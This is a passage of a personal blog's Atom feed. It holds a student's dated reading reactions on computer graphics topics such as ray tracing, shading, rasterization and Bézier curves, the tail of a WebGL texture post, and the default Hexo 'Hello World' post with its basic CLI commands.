href="https://zhuanlan.zhihu.com/p/150958567">WebGL textures</a></li><li><a href="http://www.dwenzhao.cn/profession/netbuild/html5webgl.html">WebGL programming</a></li></ul><p>üìÆ If find any errors, please feel free to discuss and correct them: <a href="mailto:&#98;&#x73;&#x75;&#x35;&#64;&#110;&#99;&#x73;&#117;&#x2e;&#x65;&#100;&#117;">&#98;&#x73;&#x75;&#x35;&#64;&#110;&#99;&#x73;&#117;&#x2e;&#x65;&#100;&#117;</a>.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Texture mapping is the process of applying a 2D image to a 3D model, and is a crucial part of creating visually appealing 3D graphics. Ho</summary>
      
    
    
    
    <category term="Coding" scheme="https://beking0912.github.io/categories/Coding/"/>
    
    
    <category term="WebGL" scheme="https://beking0912.github.io/tags/WebGL/"/>
    
  </entry>
  
  <entry>
    <title>üìñ Reading Reactions: Principles of Computer Graphics</title>
    <link href="https://beking0912.github.io/2022/10/17/Reading-Reactions-Principles-of-Computer-Graphics/"/>
    <id>https://beking0912.github.io/2022/10/17/Reading-Reactions-Principles-of-Computer-Graphics/</id>
    <published>2022-10-18T01:07:38.000Z</published>
    <updated>2023-02-19T19:16:13.972Z</updated>
    
    <content type="html"><![CDATA[<p>This document is to record my reading reactions after reading the book Fundamentals of Computer Graphics on the course <em><strong>CSC 570: Principles of Computer Graphics</strong></em> I took in my first semester. I benefited a lot from this course and also programmed some interesting projects. If you find any errors, please feel free to discuss and correct them: <a href="mailto:&#x62;&#115;&#117;&#x35;&#64;&#x6e;&#99;&#x73;&#117;&#x2e;&#x65;&#100;&#117;">&#x62;&#115;&#117;&#x35;&#64;&#x6e;&#99;&#x73;&#117;&#x2e;&#x65;&#100;&#117;</a>. üòä As an introductory Computer Graphics scholar, I would recommend the following resources.</p><ul><li><em><strong>Fundamentals of Computer Graphics</strong></em> Marshner &amp; Shirley. (2016)</li><li><em><strong>Interactive 3D Graphics</strong></em> Udacity <a href="https://www.youtube.com/playlist?list=PLAwxTw4SYaPlaHwnoGxJE7NFhEWRCIyet">youtube</a></li></ul><h2 id="09-x2F-01-x2F-2022-History"><a href="#09-x2F-01-x2F-2022-History" class="headerlink" title="09&#x2F;01&#x2F;2022 - History"></a>09&#x2F;01&#x2F;2022 - History</h2><p><em><strong>Four decades of computer graphics</strong></em><br>As a beginner in this discipline, reading this paper presented me with the challenge of understanding the terminology, so I also spent some extra time searching for it to find a better understanding. Prior to reading it, I simply assumed that computer graphics is primarily driven by the development of rendering techniques and mathematical algorithms. After reading it, I realized that computing power is also an important factor in the widespread and gradual application of computer graphics in many fields. What impresses me most is that computer graphics is still going strong after 40 years of development and various obstacles like cost and memory, and I wonder what the future focus of computer graphics practitioners would be.</p><h2 id="09-x2F-01-x2F-2022-Ray-Casting"><a href="#09-x2F-01-x2F-2022-Ray-Casting" class="headerlink" title="09&#x2F;01&#x2F;2022 - Ray Casting"></a>09&#x2F;01&#x2F;2022 - Ray Casting</h2><p><em><strong>Fundamentals of Computer Graphics - Chapter 4 Ray tracing</strong></em><br>Chapter 4 introduces the geometric method to calculate ray intersection with sth, it reminds me of a scene when playing a game: the screen shows a 3D cube, when I click on the screen with the mouse, how does the computer determine which side of the cube I am clicking on? I try to substitute the method in the Chapter 4, maybe we can convert the mouse to a ray and then convert the cube to the same spatial coordinate system with it and do the intersection detection. However, the projection on the screen is a 2D coordinate system, how to convert mouse clicked point back to 3D space? Ray tracing seems to be an ideal way to determine it.</p><h2 id="09-x2F-01-x2F-2022-Viewing"><a href="#09-x2F-01-x2F-2022-Viewing" class="headerlink" title="09&#x2F;01&#x2F;2022 - Viewing"></a>09&#x2F;01&#x2F;2022 - Viewing</h2><p><em><strong>Fundamentals of Computer Graphics - Chapter 7 Viewing</strong></em><br>In Chapter 7, I learned how to use matrix transformations to represent the positions of points in different coordinate systems during the rasterization process to complete the 3D to 2D conversion. This process gives me a more concrete understanding of the imaging principles of pinhole cameras, and I also have my own understanding, 1. modeling transformations : I interpret this step as adjusting the objects in the game scene to where they should be. 2. camera transformations: determine the position of objects relative to game perspective. 3. projection transformations: project objects from 3D to 2D according to whether it is a parallel or perspective projection. 4. viewport transformations: Map the 2D plane within screen resolution range.</p><h2 id="09-x2F-10-x2F-2022-Local-Illumination"><a href="#09-x2F-10-x2F-2022-Local-Illumination" class="headerlink" title="09&#x2F;10&#x2F;2022 - Local Illumination"></a>09&#x2F;10&#x2F;2022 - Local Illumination</h2><p><em><strong>Fundamentals of Computer Graphics - Chapter 10 Surface shading</strong></em><br>In this chapter, I learned about the application of three shading methods. After reading I think the essential difference between these three shading methods is the frequency of sampling, the higher the frequency the more it can reflect the real situation. Theoretically, the frequency of Flat Shading can be higher than Phong Shading as long as the sampled surface is smaller than the pixel.</p><h2 id="09-x2F-17-x2F-2022-Ray-Tracing"><a href="#09-x2F-17-x2F-2022-Ray-Tracing" class="headerlink" title="09&#x2F;17&#x2F;2022 - Ray Tracing"></a>09&#x2F;17&#x2F;2022 - Ray Tracing</h2><p><em><strong>An improved illumination model for shaded display</strong></em><br>I read this paper in which Turner Whitted proposes a recursive ray-tracing algorithm, and I think the most important change that makes Ray Casting better in this algorithm is to draw and analyze more rays. Unlike rasterization I learned before, this algorithm simulates the real behavior of real rays as it bounces around objects, but as we know, in the real world rays come not only from light sources, but also indirect lighting in most cases. In addition, when I saw that the generation times for drawing the scenes in the paper are so long, it made me very curious about what improvements or optimizations were made to achieve the current rendering speed.</p><h2 id="09-x2F-20-x2F-2022-WebGL"><a href="#09-x2F-20-x2F-2022-WebGL" class="headerlink" title="09&#x2F;20&#x2F;2022 - WebGL"></a>09&#x2F;20&#x2F;2022 - WebGL</h2><p><em><strong>An introduction to WebGL - Chapter 1 in WebGL: up and running</strong></em><br>I read the Chapter 1 this week. In addition to the explanation of some basic concepts, it also introduces the 8 steps of rendering WebGL into a page. For me, there are two points that are not very easy to understand, one is the use of ArrayBuffer, and the other is Shader written in advanced C-like language, but I found that if I use Three.js‚Äô Shader API, I can write it as JS instead. WebGL is an implementation subset of OpenGL. I believe that when using WebGL to render 3D graphics, the overall code size should be much less, and the semantics will be clearer.</p><h2 id="09-x2F-20-x2F-2022-Modeling"><a href="#09-x2F-20-x2F-2022-Modeling" class="headerlink" title="09&#x2F;20&#x2F;2022 - Modeling"></a>09&#x2F;20&#x2F;2022 - Modeling</h2><p><em><strong>Fundamentals of Computer Graphics - Chapter 12.1 Data Structures for Graphics</strong></em><br>I read Chapter 12.1-12.1.2, which is about the underlying part when implementing the graphics code. As we all know, the geometric transformation, detection, animation and rendering shading of 3D Graphics are all based on triangle meshes, so the basic principles and optimization strategies of triangle meshes are very important. The reason for having various data structures for triangle meshes is that we need more than just the basics of vertex position and point-face relationship when dealing with triangle meshes, we also need to obtain properties such as point-edge adjacency, connectivity, etc. In this case, if we just use the most basic data structures, it will make the operation extremely inefficient. The concept of Indexed Mesh Storage is interesting to me, it takes advantage of the shared nature of vertices, and I think it can be interpreted as a graph or a complex chain table.</p><h2 id="10-x2F-01-x2F-2022-Transformation"><a href="#10-x2F-01-x2F-2022-Transformation" class="headerlink" title="10&#x2F;01&#x2F;2022 - Transformation"></a>10&#x2F;01&#x2F;2022 - Transformation</h2><p><em><strong>Fundamentals of Computer Graphics - Chapter 6.1-6.3 Transformation Matrices</strong></em><br>I read Chapter 6.1-6.3, which deepened my understanding of the transformation nature of linear algebra in Computer Graphics, and also let me understand the practicability of linear algebra in complex transformations. The Chapter 6.1 2D Linear Transformations remind me of one of the CSS function I used before ‚Äî matrix() which can be used with CSS transforms to style elements in a 2D space, and the principle behind it is matrix multiplication. One of the more difficult to understand for me is the content in the Decomposition of Transformations, so it led me to an extensive search to further understand.</p><h2 id="10-x2F-07-x2F-2022-Projection"><a href="#10-x2F-07-x2F-2022-Projection" class="headerlink" title="10&#x2F;07&#x2F;2022 - Projection"></a>10&#x2F;07&#x2F;2022 - Projection</h2><p><em><strong>Allegory, Realism, and Vermeer‚Äôs Use of the Camera Obscuras</strong></em><br>The author reconstructed Vermeer‚Äôs studio using the camera obscura, proving that the camera obscura was used to project accurate images for painters to outline. In addition, I also learned a little bit about the book Vermeer‚Äôs Camera: Uncovering the Truth behind the Masterpieces written by the same author. It reminds me of the pinhole camera exercise I did in the first week, but I didn‚Äôt connect it with painting because the imaging results I saw at that time were not particularly clear, and the colors were not particularly restored. I was shocked that Vermeer invented this kind of ‚Äúpinhole imaging‚Äù method that works on the same principle as camera imaging, and I just feel like I was an ‚Äúartist‚Äù myself when programming 3D scenes.</p><h2 id="10-x2F-13-x2F-2022-Rasterization"><a href="#10-x2F-13-x2F-2022-Rasterization" class="headerlink" title="10&#x2F;13&#x2F;2022 - Rasterization"></a>10&#x2F;13&#x2F;2022 - Rasterization</h2><p><em><strong>Fundamentals of Computer Graphics - Chapter 8.1 The graphics pipeline</strong></em><br>I learned the Chapter 8.1 which introduces rasterization and two functions of clipping, pseudocodes in the chapter are really helpful for me. In chapter 4 I learned that ray tracing is a kind of image-order rendering and rasterization in this chapter is a kind of object-order rendering. What I found interesting was that I did have some questions that came up during the reading 8.1.2 Triangle Rasterization, and these questions in detail happened to be memtioned one by one in this chapter, such as the problem when the center of gravity of a pixel falls exactly on the common side of two triangles.</p><h2 id="10-x2F-13-x2F-2022-Pipeline"><a href="#10-x2F-13-x2F-2022-Pipeline" class="headerlink" title="10&#x2F;13&#x2F;2022 - Pipeline"></a>10&#x2F;13&#x2F;2022 - Pipeline</h2><p><em><strong>Fundamentals of Computer Graphics - Chapter 8.2-8.3 The graphics pipeline</strong></em><br>In Chapter 8.2-8.3, I learned about geometry operations before rasterization and pixel operations after rasterization and their purpose based on examples. Personal understandingÔºå briefly, what the vertex processing stage does is to add necessary information to the view based on the conversion, and finally the fragment blending stage combines all the geometric primitive to calculate the final color. Rasterization produces jagged lines and triangular edges as we all know, so the method of antialiasing also deserves attention, SSAA is the simplest antialiasing algorithm, but the performance overhead is also huge, I would like to know which methods are currently the most widely used.</p><h2 id="10-x2F-18-x2F-2022-Shading"><a href="#10-x2F-18-x2F-2022-Shading" class="headerlink" title="10&#x2F;18&#x2F;2022 - Shading"></a>10&#x2F;18&#x2F;2022 - Shading</h2><p><em><strong>Illumination for computer generated pictures - Bui Tuong Phong 1975</strong></em><br>I read this paper where the author effectively simulated diffuse reflections and highlights by a purely geometric approach and proposed Phong reflection model for computing highlights which is still active in the field of real-time rendering nowadays. This model divides the lighting into 3 parts, ambient, diffuse, and specular reflections, however, it required some overhead involved in calculating the light reflection vector, leading to the development of the Blinn-Phong model that commonly we used today.</p><h2 id="10-x2F-18-x2F-2022-Texture"><a href="#10-x2F-18-x2F-2022-Texture" class="headerlink" title="10&#x2F;18&#x2F;2022 - Texture"></a>10&#x2F;18&#x2F;2022 - Texture</h2><p><em><strong>Fundamentals of Computer Graphics - Chapter 11.1-11.4 Texture mapping</strong></em><br>In this Chapter, I read about the traditional texture mapping in graphics. I have to say that the examples given in the text are very vivid and helpful for my understanding. Contrary to what I thought before reading, texture mapping doesn‚Äôt change the shape of the surface, it doesn‚Äôt add or subtract polygons actually. I learned that the basic idea to make the surface textured in this chapter is to make the texture into a texture map&#x2F;image, then find the corresponding color from the image and apply it to the vertices of the surface when shading.</p><h2 id="10-x2F-28-x2F-2022-Hidden-Surfaces"><a href="#10-x2F-28-x2F-2022-Hidden-Surfaces" class="headerlink" title="10&#x2F;28&#x2F;2022 - Hidden Surfaces"></a>10&#x2F;28&#x2F;2022 - Hidden Surfaces</h2><p><em><strong>Haines, E. Videos 38-44 and 109-110 of Udacity‚Äôs Interactive 3D Graphics course</strong></em><br>I learned abut z-buffer and z-fighting in this week‚Äôs readings. We can know that when the objects are occluded from each other in depth, they cannot be sorted in advance using the painter‚Äôs algorithm. Unlike the painter‚Äôs algorithm, the z-buffer does not need to sort the objects from far to near, but for each pixel, so only linear complexity is required. And z-fighting is also interesting and easy to understand because of the accuracy error in the computation.</p><h2 id="11-x2F-04-x2F-2022-Images-amp-displays"><a href="#11-x2F-04-x2F-2022-Images-amp-displays" class="headerlink" title="11&#x2F;04&#x2F;2022 - Images &amp; displays"></a>11&#x2F;04&#x2F;2022 - Images &amp; displays</h2><p><em><strong>Fundamentals of Computer Graphics - Chapter 3.1-3.2 Raster images &amp; Chapter 17.4 Graphics hardware buffers</strong></em><br>After reading Chapter 3.1-3.2, I gained a lot of new insights especially nonlinearities of standard display, such as the fact that monitors display the input pixel values non-linearly, and I learned that human perception of color is also non-linear. As a result, the meaning of Gamma is the efficient use of color storage to achieve the effect that the input equals the output. In Chapter 17.4 I learned some basic concepts of Graphics Hardware Programming.</p><h2 id="11-x2F-10-x2F-2022-Aliasing"><a href="#11-x2F-10-x2F-2022-Aliasing" class="headerlink" title="11&#x2F;10&#x2F;2022 - Aliasing"></a>11&#x2F;10&#x2F;2022 - Aliasing</h2><p><em><strong>Fundamentals of Computer Graphics - Chapter 9 Signal processing</strong></em><br>I read Chapter 9 this week, which introduces the principles behind the algorithm that improves image quality, and personally I think this chapter is not easy to understand. I learned that in simple terms, aliasing occurs because it is considered as a low frequency signal due to undersampling, jaggies and moire pattern are two common artifacts in images. This chapter also introduces some important applications of convolution in image processing, and I think is the most difficult part, which led me to an extensive search to further understand.</p><h2 id="11-x2F-19-x2F-2022-Structures"><a href="#11-x2F-19-x2F-2022-Structures" class="headerlink" title="11&#x2F;19&#x2F;2022 - Structures"></a>11&#x2F;19&#x2F;2022 - Structures</h2><p><em><strong>Fundamentals of Computer Graphics - Chapter 12.1.3-12.2 Data Structures for Graphics</strong></em><br>I found that Scene Graphs are an interesting data structure and is not difficult to understand for me. Store by tree structure, use the root node of the scene as the root of the tree, and then continuously expand to the deeper layers of the tree, where each node keeps the information of attributes and its transformation matrix. When render the scene, use the composite matrix in the stack to draw the objects by DFS. In summary, its essence is the use of multiway tree and stack.</p><h2 id="11-x2F-26-x2F-2022-Curves"><a href="#11-x2F-26-x2F-2022-Curves" class="headerlink" title="11&#x2F;26&#x2F;2022 - Curves"></a>11&#x2F;26&#x2F;2022 - Curves</h2><p><em><strong>Fundamentals of Computer Graphics - Chapter 15 Curves</strong></em><br>I read the Chapter 15 this week which discusses three representations of curves. I‚Äôm really interested in the B√©zier Curves part because it reminds me of the vector editor I wrote before which allows designers to create and modify vector curves, at that time I encountered some interesting questions while programming, such as how the adjacent curve points change when dragging edge, how to compute the nearest point on the curve when mouse hover. And I think that Figma‚Äôs Vector Networks that implemented the B√©zier Curves are super cool. Anyway, here is a primer on B√©zier Curves I would recommend: <a href="https://pomax.github.io/bezierinfo/index.html">https://pomax.github.io/bezierinfo/index.html</a>.</p><h2 id="11-x2F-26-x2F-2022-Color"><a href="#11-x2F-26-x2F-2022-Color" class="headerlink" title="11&#x2F;26&#x2F;2022 - Color"></a>11&#x2F;26&#x2F;2022 - Color</h2><p><em><strong>Fundamentals of Computer Graphics - Chapter 19 Color</strong></em><br>The color format I use most often is RGB, the chapter 19 refreshed my perception of color that the RGB color space can only represent a small part of the XYZ color space. Storing linear RGB color values in an 8-bit per image format results in visually low accuracy due to the non-linearity of human color perception, and to improve the visual quality, sRGB is defined with a gamma correction that gives a non-linear distribution of values.</p><h2 id="11-x2F-29-x2F-2022-Perception"><a href="#11-x2F-29-x2F-2022-Perception" class="headerlink" title="11&#x2F;29&#x2F;2022 - Perception"></a>11&#x2F;29&#x2F;2022 - Perception</h2><p><em><strong>Videos 12 to 17 of Udacity‚Äôs Interactive 3D Graphics course</strong></em><br>I watched the videos 12 to 17 learning about perception and the difference between camera and human eyes. I found the checker shadow illusion in the video 15 is interesting which shows that the subjective brightness perceived from an object is influenced by the relative relationship between the surrounding environment, it is a kind of compensatory of the human perception, where the visual system makes correction errors when counteracts the variations of light and dark in different backgrounds.</p><img src="https://blush.design/api/download?shareUri=HmfkaZ7RkuyKIxtR&c=Clothing_0%7Eff4b33&w=800&h=800&fm=png" width="50%" height="50%">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;This document is to record my reading reactions after reading the book Fundamentals of Computer Graphics on the course &lt;em&gt;&lt;strong&gt;CSC 57</summary>
      
    
    
    
    <category term="Reading" scheme="https://beking0912.github.io/categories/Reading/"/>
    
    
  </entry>
  
  <entry>
    <title>üëã Hello World</title>
    <link href="https://beking0912.github.io/2022/10/14/hello-world/"/>
    <id>https://beking0912.github.io/2022/10/14/hello-world/</id>
    <published>2022-10-14T05:09:50.814Z</published>
    <updated>2023-02-19T19:14:38.402Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
    <category term="Hexo" scheme="https://beking0912.github.io/tags/Hexo/"/>
    
  </entry>
  
</feed>
